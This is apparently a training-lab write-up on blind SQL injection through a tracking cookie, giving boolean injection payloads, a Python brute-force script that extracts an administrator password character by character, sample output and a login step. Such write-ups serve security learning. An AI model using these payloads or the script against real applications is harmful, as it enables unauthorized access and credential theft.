### Eleven Exercise 👆


![problem.PNG](/assets/SQLi/Eleven/problem.PNG)


#### **To do**

```
This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and no error messages are displayed. But the application includes a "Welcome back" message in the page if the query returns any rows.

The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.

To solve the lab, log in as the administrator user.   
```

1. Should use a cookie to execute SQL Injection
![cookie.PNG](/assets/SQLi/Eleven/cookie.PNG)

* The problem informs us that we will be blind, then, if the query is wrong or accert we will not be informed.
* A message **Welcome back!** is util to know if the query is accert.

2. Know if exist **administrator user**
```sql
' or (select substring(username,1,1) from users where username = 'administrator') = 'a
```
* Do this to know if exist a username start with letter 'a


3. Find the lenght of password
```sql
' or (select substring(password,1,1) from users where username = 'administrator' and length(password)>=20) = 'a
```

* Use `length(password)` to discover length of password field, do this until the message "Welcome back!" not appear.

* In my case the length is **20**



4. To discover the password we need to create a program in python to iterate each position:


```python
#!/usr/bin/python3

from pwn import *
import requests, time, string, signal, sys


def handler_stop(sig, frame):
        print("\n\n[!] Exiting... Bye")
        sys.exit(1)

def make_request():
    url = "<url of web page>"
    characteres = string.ascii_lowercase + string.digits
    password = ""
    bar_1 = log.progress("Brute Force")
    bar_1.status("Starting Brute Force...")
    time.sleep(1)
    bar_2 = log.progress("Password")
    
    for i in range(1,21):
        for character in characteres:
            cookie = {f"TrackingId": "<your TrackingId>' and (select substring(password,{i},1) from users where username='administrator') = '{character}",
                    "session": "<your session>"
            }
            bar_1.status(cookie["TrackingId"])
            r = requests.get(url, cookies=cookie)   
            if ("Welcome back!" in r.text):
                password += character
                bar_2.status(password)
                break
#! Ctrl + C
signal.signal(signal.SIGINT, handler_stop)

if __name__ == "__main__":
    make_request()
```
* With this program we try to know the letter in each position of password length.
* In each position we try: `abcdefghijklmnopqrstuvwxyz0123456789`




**Output**
```bash
┌──(root㉿est)-[/home/kali/Desktop]
└─| python3 brute_force.py
[┬] Brute Force: 5Ey6UAGo7wYO8MBQ' and (select substring(password,20,1) from users where username='administrator') = 'v
[◑] Password: oqpz5a69kh1gyacprnav
```

5. Finally login with credentials:
* **username**: administrator
* **password**: [output program]

![login.txt](/assets/SQLi/Eleven/login.PNG)